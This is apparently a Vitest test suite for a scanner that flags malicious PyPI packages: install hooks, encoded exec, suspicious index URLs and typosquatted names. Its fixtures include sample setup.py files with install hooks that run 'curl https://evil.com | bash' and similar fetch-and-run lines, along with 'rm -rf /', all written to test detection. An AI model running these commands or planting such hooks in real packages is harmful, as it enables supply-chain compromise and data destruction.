import { describe, it, expect } from "vitest";
import * as fs from "node:fs";
import * as path from "node:path";
import {
  PYPI_FILE_PATTERNS,
  PYPI_INSTALL_HOOK_PATTERNS,
  PYPI_SETUP_FILES,
  PYPI_TYPOSQUAT_PATTERNS,
  PYTHON_EXTENSIONS,
} from "../patterns.js";
import {
  analyzeSetupFileContext,
  checkInstallRequires,
} from "../pypi-scanner.js";
import type { Finding } from "../types.js";

describe("PyPI Scanner Patterns", () => {
  describe("Python malicious code detection", () => {
    it("should detect os.system() calls", () => {
      const code = 'os.system("curl https://evil.com | bash")';
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_OS_SYSTEM",
      );
      expect(pattern).toBeDefined();
      expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
    });

    it("should detect subprocess.call() and subprocess.run()", () => {
      const codes = [
        'subprocess.call(["curl", "https://evil.com"])',
        'subprocess.run(["wget", "https://evil.com/payload"])',
        'subprocess.Popen(["bash", "-c", "malicious"])',
        'subprocess.check_output(["id"])',
        'subprocess.check_call(["rm", "-rf", "/"])',
      ];
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_SUBPROCESS",
      );
      expect(pattern).toBeDefined();

      for (const code of codes) {
        expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
      }
    });

    it("should detect exec() with encoded strings", () => {
      const codes = [
        'exec(base64.b64decode("aW1wb3J0IG9z"))',
        'exec(codecs.decode("payload", "rot13"))',
        'exec(bytes.fromhex("696d706f7274206f73").decode())',
      ];
      const execPattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_EXEC_ENCODED",
      );
      expect(execPattern).toBeDefined();

      for (const code of codes) {
        expect(new RegExp(execPattern!.pattern).test(code)).toBe(true);
      }
    });

    it("should detect eval() with encoded strings", () => {
      const codes = [
        'eval(base64.b64decode("aW1wb3J0IG9z"))',
        'eval(codecs.decode("payload", "rot13"))',
        'eval(bytes.fromhex("696d706f7274206f73").decode())',
      ];
      const evalPattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_EVAL_ENCODED",
      );
      expect(evalPattern).toBeDefined();

      for (const code of codes) {
        expect(new RegExp(evalPattern!.pattern).test(code)).toBe(true);
      }
    });

    it("should detect __import__('base64') pattern", () => {
      const codes = [
        "__import__('base64')",
        '__import__("base64")',
      ];
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_IMPORT_BASE64",
      );
      expect(pattern).toBeDefined();

      for (const code of codes) {
        expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
      }
    });

    it("should detect __import__('marshal') pattern", () => {
      const code = "__import__('marshal')";
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_IMPORT_MARSHAL",
      );
      expect(pattern).toBeDefined();
      expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
    });

    it("should detect pip install from suspicious URLs", () => {
      const code =
        "pip install --index-url https://evil.com/simple/ malicious-pkg";
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_SUSPICIOUS_INDEX",
      );
      expect(pattern).toBeDefined();
      expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
    });

    it("should NOT flag pip install from pypi.org", () => {
      const code =
        "pip install --index-url https://pypi.org/simple/ some-pkg";
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_SUSPICIOUS_INDEX",
      );
      expect(pattern).toBeDefined();
      expect(new RegExp(pattern!.pattern).test(code)).toBe(false);
    });

    it("should detect urllib.request.urlopen()", () => {
      const code = 'urllib.request.urlopen("https://evil.com/payload")';
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_URLLIB_FETCH",
      );
      expect(pattern).toBeDefined();
      expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
    });

    it("should detect exec(compile()) pattern", () => {
      const code = 'exec(compile(open("payload.py").read(), "<string>", "exec"))';
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_EXEC_COMPILE",
      );
      expect(pattern).toBeDefined();
      expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
    });

    it("should detect install class override (class inheriting from install)", () => {
      const codes = [
        "class CustomInstall(install):",
        "class PostInstall(develop):",
        "class MyEggInfo(egg_info):",
        "class BuildStep(bdist_egg):",
        "class MySdist(sdist):",
      ];
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_INSTALL_CLASS_OVERRIDE",
      );
      expect(pattern).toBeDefined();

      for (const code of codes) {
        expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
      }
    });

    it("should detect marshal.loads() calls", () => {
      const codes = [
        'marshal.loads(encoded_data)',
        'result = marshal.loads(payload)',
      ];
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_MARSHAL_LOADS",
      );
      expect(pattern).toBeDefined();

      for (const code of codes) {
        expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
      }
    });

    it("should detect exec(marshal.loads()) pattern", () => {
      const code = 'exec(marshal.loads(base64.b64decode("payload")))';
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_EXEC_MARSHAL",
      );
      expect(pattern).toBeDefined();
      expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
    });

    it("should detect base64.b64decode combined with exec on same line", () => {
      const codes = [
        'data = base64.b64decode("payload"); exec(data)',
        'exec(base64.b64decode("hidden"))',
      ];
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_B64_EXEC_COMBINED",
      );
      expect(pattern).toBeDefined();

      for (const code of codes) {
        expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
      }
    });
  });

  describe("Install hook detection", () => {
    it("should detect custom install cmdclass", () => {
      const code = `cmdclass = {'install': CustomInstall}`;
      const pattern = PYPI_INSTALL_HOOK_PATTERNS.find(
        (p) => p.rule === "PYPI_CUSTOM_INSTALL",
      );
      expect(pattern).toBeDefined();
      expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
    });

    it("should detect custom develop cmdclass", () => {
      const code = `cmdclass = {"develop": CustomDevelop}`;
      const pattern = PYPI_INSTALL_HOOK_PATTERNS.find(
        (p) => p.rule === "PYPI_CUSTOM_DEVELOP",
      );
      expect(pattern).toBeDefined();
      expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
    });

    it("should detect custom egg_info cmdclass", () => {
      const code = `cmdclass = {'egg_info': CustomEggInfo}`;
      const pattern = PYPI_INSTALL_HOOK_PATTERNS.find(
        (p) => p.rule === "PYPI_CUSTOM_EGG_INFO",
      );
      expect(pattern).toBeDefined();
      expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
    });

    it("should detect custom build_ext cmdclass", () => {
      const code = `cmdclass = {'build_ext': CustomBuildExt}`;
      const pattern = PYPI_INSTALL_HOOK_PATTERNS.find(
        (p) => p.rule === "PYPI_CUSTOM_BUILD_EXT",
      );
      expect(pattern).toBeDefined();
      expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
    });
  });

  describe("Setup file combined analysis", () => {
    it("should detect cmdclass + subprocess as hook with system exec", () => {
      const setupPy = `
from setuptools import setup
from setuptools.command.install import install
import subprocess

class PostInstallCommand(install):
    def run(self):
        subprocess.run(["curl", "https://evil.com/payload.sh", "-o", "/tmp/p.sh"])
        install.run(self)

setup(
    name='malicious-pkg',
    cmdclass={'install': PostInstallCommand},
)`;
      const findings: Finding[] = [];
      analyzeSetupFileContext(setupPy, "setup.py", findings);
      const hookExec = findings.find((f) => f.rule === "PYPI_HOOK_SYSTEM_EXEC");
      expect(hookExec).toBeDefined();
      expect(hookExec!.severity).toBe("critical");
    });

    it("should detect cmdclass + os.system as hook with system exec", () => {
      const setupPy = `
from setuptools import setup
from setuptools.command.install import install
import os

class PostInstall(install):
    def run(self):
        os.system("curl https://evil.com/malware | bash")
        install.run(self)

setup(
    name='evil-pkg',
    cmdclass={'install': PostInstall},
)`;
      const findings: Finding[] = [];
      analyzeSetupFileContext(setupPy, "setup.py", findings);
      expect(findings.some((f) => f.rule === "PYPI_HOOK_SYSTEM_EXEC")).toBe(true);
    });

    it("should detect cmdclass + obfuscated exec (base64 + exec)", () => {
      const setupPy = `
from setuptools import setup
from setuptools.command.install import install
import base64

class CustomInstall(install):
    def run(self):
        exec(base64.b64decode("aW1wb3J0IHN1YnByb2Nlc3M="))
        install.run(self)

setup(
    name='obfuscated-pkg',
    cmdclass={'install': CustomInstall},
)`;
      const findings: Finding[] = [];
      analyzeSetupFileContext(setupPy, "setup.py", findings);
      const hookObf = findings.find((f) => f.rule === "PYPI_HOOK_OBFUSCATED_EXEC");
      expect(hookObf).toBeDefined();
      expect(hookObf!.severity).toBe("critical");
    });

    it("should detect cmdclass + marshal.loads as obfuscated exec", () => {
      const setupPy = `
from setuptools import setup
from setuptools.command.install import install
import marshal

class CustomInstall(install):
    def run(self):
        exec(marshal.loads(payload_bytes))
        install.run(self)

setup(
    name='bytecode-pkg',
    cmdclass={'install': CustomInstall},
)`;
      const findings: Finding[] = [];
      analyzeSetupFileContext(setupPy, "setup.py", findings);
      expect(findings.some((f) => f.rule === "PYPI_HOOK_OBFUSCATED_EXEC")).toBe(true);
    });

    it("should detect cmdclass + urllib download as hook with download", () => {
      const setupPy = `
from setuptools import setup
from setuptools.command.install import install
import urllib.request

class PostInstall(install):
    def run(self):
        urllib.request.urlopen("https://evil.com/payload")
        install.run(self)

setup(
    name='download-pkg',
    cmdclass={'install': PostInstall},
)`;
      const findings: Finding[] = [];
      analyzeSetupFileContext(setupPy, "setup.py", findings);
      expect(findings.some((f) => f.rule === "PYPI_HOOK_DOWNLOAD")).toBe(true);
    });

    it("should detect cmdclass + requests.get as hook with download", () => {
      const setupPy = `
from setuptools import setup
from setuptools.command.install import install
import requests

class PostInstall(install):
    def run(self):
        requests.get("https://evil.com/payload")
        install.run(self)

setup(
    name='download-pkg',
    cmdclass={'install': PostInstall},
)`;
      const findings: Finding[] = [];
      analyzeSetupFileContext(setupPy, "setup.py", findings);
      expect(findings.some((f) => f.rule === "PYPI_HOOK_DOWNLOAD")).toBe(true);
    });

    it("should detect install class override without cmdclass dict", () => {
      const setupPy = `
from setuptools.command.install import install
import subprocess

class EvilInstall(install):
    def run(self):
        subprocess.run(["bash", "-c", "curl evil.com | sh"])
        install.run(self)
`;
      const findings: Finding[] = [];
      analyzeSetupFileContext(setupPy, "setup.py", findings);
      expect(findings.some((f) => f.rule === "PYPI_HOOK_SYSTEM_EXEC")).toBe(true);
    });

    it("should NOT flag setup.py without cmdclass or install override", () => {
      const setupPy = `
from setuptools import setup

setup(
    name='clean-pkg',
    version='1.0.0',
    install_requires=['requests>=2.0'],
)`;
      const findings: Finding[] = [];
      analyzeSetupFileContext(setupPy, "setup.py", findings);
      expect(findings.some((f) => f.rule === "PYPI_HOOK_SYSTEM_EXEC")).toBe(false);
      expect(findings.some((f) => f.rule === "PYPI_HOOK_OBFUSCATED_EXEC")).toBe(false);
      expect(findings.some((f) => f.rule === "PYPI_HOOK_DOWNLOAD")).toBe(false);
    });
  });

  describe("Typosquatted dependency detection", () => {
    it("should detect typosquatted packages in install_requires", () => {
      const setupPy = `
setup(
    name='evil-pkg',
    install_requires=['r3quests>=2.0', 'crypt0graphy'],
)`;
      const findings: Finding[] = [];
      checkInstallRequires(setupPy, "setup.py", findings);
      expect(findings.length).toBe(2);
      expect(findings[0]!.rule).toBe("PYPI_TYPOSQUAT_DEP");
      expect(findings[0]!.match).toBe("r3quests");
      expect(findings[1]!.match).toBe("crypt0graphy");
    });

    it("should detect various typosquatted package names", () => {
      const typosquats = [
        "reqeusts", "requsets", "r3quests",
        "crypt0graphy", "crytography",
        "python-dateutill", "numppy", "numpi",
        "pandsa", "djang0", "dajngo",
        "urlib3", "colourama", "colrama",
        "setuptool", "flaskk", "flaask",
      ];

      for (const pkg of typosquats) {
        let matched = false;
        for (const pattern of PYPI_TYPOSQUAT_PATTERNS) {
          if (new RegExp(pattern).test(pkg)) {
            matched = true;
            break;
          }
        }
        expect(matched).toBe(true);
      }
    });

    it("should NOT flag legitimate package names", () => {
      const legitimate = [
        "requests", "cryptography", "python-dateutil",
        "numpy", "pandas", "django", "flask",
        "urllib3", "colorama", "setuptools",
      ];

      for (const pkg of legitimate) {
        let matched = false;
        for (const pattern of PYPI_TYPOSQUAT_PATTERNS) {
          if (new RegExp(pattern).test(pkg)) {
            matched = true;
            break;
          }
        }
        expect(matched).toBe(false);
      }
    });

    it("should flag very long single-word lowercase names", () => {
      const longName = "abcdefghijklmnopqrstu"; // 21 chars
      let matched = false;
      for (const pattern of PYPI_TYPOSQUAT_PATTERNS) {
        if (new RegExp(pattern).test(longName)) {
          matched = true;
          break;
        }
      }
      expect(matched).toBe(true);
    });

    it("should strip version specifiers before checking", () => {
      const setupPy = `
setup(
    install_requires=['requsets>=1.0.0', 'numppy==1.2.3'],
)`;
      const findings: Finding[] = [];
      checkInstallRequires(setupPy, "setup.py", findings);
      expect(findings.length).toBe(2);
      expect(findings[0]!.match).toBe("requsets");
      expect(findings[1]!.match).toBe("numppy");
    });

    it("should handle install_requires with no typosquats", () => {
      const setupPy = `
setup(
    install_requires=['requests>=2.0', 'flask', 'numpy'],
)`;
      const findings: Finding[] = [];
      checkInstallRequires(setupPy, "setup.py", findings);
      expect(findings.length).toBe(0);
    });

    it("should handle missing install_requires gracefully", () => {
      const setupPy = `
setup(
    name='minimal-pkg',
    version='1.0.0',
)`;
      const findings: Finding[] = [];
      checkInstallRequires(setupPy, "setup.py", findings);
      expect(findings.length).toBe(0);
    });
  });

  describe("Pattern metadata", () => {
    it("should have correct severity for critical patterns", () => {
      const criticalRules = [
        "PYPI_EXEC_ENCODED", "PYPI_EVAL_ENCODED", "PYPI_SUSPICIOUS_INDEX",
        "PYPI_EXEC_MARSHAL", "PYPI_B64_EXEC_COMBINED",
      ];
      for (const rule of criticalRules) {
        const pattern = PYPI_FILE_PATTERNS.find((p) => p.rule === rule);
        expect(pattern).toBeDefined();
        expect(pattern!.severity).toBe("critical");
      }
    });

    it("should have correct severity for high patterns", () => {
      const highRules = [
        "PYPI_OS_SYSTEM",
        "PYPI_SUBPROCESS",
        "PYPI_IMPORT_BASE64",
        "PYPI_IMPORT_MARSHAL",
        "PYPI_URLLIB_FETCH",
        "PYPI_EXEC_COMPILE",
        "PYPI_MARSHAL_LOADS",
      ];
      for (const rule of highRules) {
        const pattern = PYPI_FILE_PATTERNS.find((p) => p.rule === rule);
        expect(pattern).toBeDefined();
        expect(pattern!.severity).toBe("high");
      }
    });

    it("should include all expected PyPI setup files", () => {
      expect(PYPI_SETUP_FILES.has("setup.py")).toBe(true);
      expect(PYPI_SETUP_FILES.has("setup.cfg")).toBe(true);
      expect(PYPI_SETUP_FILES.has("pyproject.toml")).toBe(true);
    });

    it("should include all expected Python extensions", () => {
      expect(PYTHON_EXTENSIONS.has(".py")).toBe(true);
      expect(PYTHON_EXTENSIONS.has(".pyw")).toBe(true);
      expect(PYTHON_EXTENSIONS.has(".pyi")).toBe(true);
    });
  });

  describe("Pattern non-matches (false positive avoidance)", () => {
    it("should not flag normal print statements as exec", () => {
      const code = 'print("Hello, world!")';
      const execPattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_EXEC_ENCODED",
      );
      expect(new RegExp(execPattern!.pattern).test(code)).toBe(false);
    });

    it("should not flag normal import statements", () => {
      const code = "import base64";
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_IMPORT_BASE64",
      );
      expect(new RegExp(pattern!.pattern).test(code)).toBe(false);
    });

    it("should not flag os.path operations as os.system", () => {
      const code = 'result = os.path.join("/tmp", "file.txt")';
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_OS_SYSTEM",
      );
      expect(new RegExp(pattern!.pattern).test(code)).toBe(false);
    });

    it("should not flag normal eval of literals", () => {
      // Plain eval without encoding should not match PYPI_EVAL_ENCODED
      const code = 'eval("1 + 1")';
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_EVAL_ENCODED",
      );
      expect(new RegExp(pattern!.pattern).test(code)).toBe(false);
    });

    it("should not flag normal class inheritance as install override", () => {
      const code = "class MyClass(BaseClass):";
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_INSTALL_CLASS_OVERRIDE",
      );
      expect(new RegExp(pattern!.pattern).test(code)).toBe(false);
    });

    it("should not flag marshal.dumps as marshal.loads", () => {
      const code = "marshal.dumps(data)";
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_MARSHAL_LOADS",
      );
      expect(new RegExp(pattern!.pattern).test(code)).toBe(false);
    });

    it("should not flag base64.b64decode without exec", () => {
      const code = 'data = base64.b64decode("aGVsbG8=")';
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_B64_EXEC_COMBINED",
      );
      expect(new RegExp(pattern!.pattern).test(code)).toBe(false);
    });
  });
});
